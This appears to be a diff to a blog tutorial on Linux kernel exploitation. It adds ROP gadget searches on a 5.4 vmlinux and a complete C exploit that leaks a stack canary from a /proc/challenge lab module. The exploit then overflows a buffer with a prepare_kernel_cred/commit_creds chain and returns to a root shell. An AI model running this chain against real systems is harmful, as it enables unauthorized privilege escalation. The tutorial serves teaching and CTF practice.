@@ -153,7 +153,27 @@ void cleanup_module(void)
 </code></pre>
 </div>
 <h2 id=building-a-complete-escalation-chain>Building a Complete Escalation Chain<a href=#building-a-complete-escalation-chain class=hanchor arialabel=Anchor>&#8983;</a> </h2>
-<p>&mldr;</p>
+<p>We&rsquo;ll need several different gadgets to build our complete escalation chain. Let&rsquo;s look for a <code>pop rdi</code> gadget for function calls, these are quite easy to find.</p>
+<pre><code>~/pwnkernel $ rp++ -f linux-5.4/vmlinux -r 1 --unique | grep 'pop rdi ; ret'
+0xffffffff81001518: pop rdi ; ret  ;  (7337 found)
+...
+</code></pre><p>We&rsquo;ll also need a <code>swapgs</code> instruction in order to return to user-space, this was also found quite easily.</p>
+<pre><code>~/pwnkernel $ rp++ -f linux-5.4/vmlinux -r 2 --unique | grep 'swapgs'
+0xffffffff81c00eaa: swapgs  ; popfq  ; ret  ;  (1 found)
+</code></pre><p>One of the trickier gadgets to find was a gadget that allowed us to move the value of <code>rax</code> (a return value) into <code>rdi</code> for a subsequent function call. I settled on a <code>add rdi, rax</code> gadget.</p>
+<pre><code>~/pwnkernel $ rp++ -f linux-5.4/vmlinux -r 3 --unique | grep 'add rdi, rax'
+0xffffffff8158f72a: add rdi, rax ; cmp rdi, 0x01 ; setbe al ; ret  ;  (1 found)
+</code></pre><p>Lastly, we need an <code>iret</code> instruction to return to user-space. This was a little annoying to find as <code>rp++</code> didn&rsquo;t seem to like finding <code>iret</code> instructions, so here&rsquo;s an <code>objdump</code> command that does the same thing.</p>
+<pre><code>~/pwnkernel $ objdump -j .text -d linux-5.4/vmlinux | grep 'iret'
+ffffffff8101a9e3:   e8 d8 4d 00 00          callq  ffffffff8101f7c0 &lt;show_iret_regs&gt;
+ffffffff8101c490 &lt;fixup_bad_iret&gt;:
+ffffffff8101c4d3:   74 04                   je     ffffffff8101c4d9 &lt;fixup_bad_iret+0x49&gt;
+ffffffff8101f7c0 &lt;show_iret_regs&gt;:
+ffffffff8101f856:   e9 65 ff ff ff          jmpq   ffffffff8101f7c0 &lt;show_iret_regs&gt;
+ffffffff81023cc2:   48 cf                   iretq
+...
+</code></pre><p>Putting all these together we can construct a complete escalation chain that mimics the process that the kernel uses to return back to user-space, allowing us to bypass SMAP with a ROP chain.</p>
+<p>Note the <code>iret</code> frame at the end of the chain, this will sit at the top of our stack when the <code>iret</code> instruction is executed.</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>overflow_buffer</span>(<span style=color:#66d9ef>int</span> fd, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> canary)
 {
     <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> payload[<span style=color:#ae81ff>20</span>];
@@ -182,7 +202,8 @@ void cleanup_module(void)
     write(fd, payload, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>) <span style=color:#f92672>*</span> <span style=color:#ae81ff>20</span>);
 }
 </code></pre></div><h2 id=environment-setup>Environment Setup<a href=#environment-setup class=hanchor arialabel=Anchor>&#8983;</a> </h2>
-<p>&mldr;</p>
+<p>Taking our <code>launch.sh</code> script from the previous Linux kernel exploitation post (bypassing smep), all we need to add is the additional <code>+smap</code> flag to the <code>-cpu kvm64,+smep</code> line.</p>
+<p>Note that we&rsquo;ll also be using linux kernel version 5.4, so make sure to update that if using a different kernel version.</p>
 <div class=collapsable-code>
 <input id=1 type=checkbox>
 <label for=1>
@@ -221,9 +242,87 @@ popd
 <span class=collapsable-code__toggle data-label-expand=Show data-label-collapse=Hide></span>
 </label>
 <pre class=language-c><code>
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+
+unsigned long save_ss, save_sp, save_rf, save_cs;
+
+void shell()
+{
+    system(&#34;/bin/sh&#34;);
+}
+
+void save_user_space()
+{
+    /* save user-space */
+    __asm__(
+        &#34;.intel_syntax noprefix;&#34;
+        &#34;mov save_ss, ss;&#34;
+        &#34;mov save_sp, rsp;&#34;
+        &#34;pushf;&#34;
+        &#34;pop save_rf;&#34;
+        &#34;mov save_cs, cs;&#34;
+        &#34;.att_syntax;&#34;
+    ); 
+}
+
+unsigned long leak_canary(int fd)
+{
+    unsigned long leak[5];
+    read(fd, leak, sizeof(unsigned long) * 5);
+    return leak[4];
+}
+
+void overflow_buffer(int fd, unsigned long canary)
+{
+    unsigned long payload[20];
+
+    payload[4] = canary;
+    
+    payload[5] = 0xffffffff81001518; // pop rdi; ret
+    payload[6] = 0x00;               // rdi = 0x00
+    payload[7] = 0xffffffff810881c0; // prepare_kernel_cred
+
+    payload[8]  = 0xffffffff81001518; // pop rdi; ret
+    payload[9]  = 0x00;               // rdi = 0x00
+    payload[10] = 0xffffffff8158f72a; // add rdi, rax; cmp rdi, 0x1; setbe al; ret
+    payload[11] = 0xffffffff81087e80; // commit_creds
+
+    payload[12] = 0xffffffff81c00eaa; // swapgs; pop rbp; ret
+    payload[13] = 0x00;               // rbp = 0x00
+
+    payload[14] = 0xffffffff81023cc2; // iretq 
+    payload[15] = (unsigned long)shell;
+    payload[16] = save_cs;
+    payload[17] = save_rf;
+    payload[18] = save_sp;
+    payload[19] = save_ss;
+
+    write(fd, payload, sizeof(unsigned long) * 20);
+}
+
+int main(int argc, char **argv)
+{
+    save_user_space();
+
+    int fd = open(&#34;/proc/challenge&#34;, O_RDWR);
+    assert(fd &gt; 0);
+
+    /* leak stack canary */
+    unsigned long canary = leak_canary(fd);
+    printf(&#34;[*] canary @ 0x%lx\n&#34;, canary);
+
+    overflow_buffer(fd, canary); 
+
+    return 0;
+}
 </code></pre>
 </div>
-<h2 id=fixing-the-exploit-with-a-sigsegv-handler>Fixing the Exploit with a SIGSEGV Handler<a href=#fixing-the-exploit-with-a-sigsegv-handler class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<p>&mldr;</p>
+<pre><code></code></pre><h2 id=fixing-the-exploit-with-a-sigsegv-handler>Fixing the Exploit with a SIGSEGV Handler<a href=#fixing-the-exploit-with-a-sigsegv-handler class=hanchor arialabel=Anchor>&#8983;</a> </h2>
 <p>&mldr;</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>signal_handler</span>(<span style=color:#66d9ef>int</span> signum)
 {
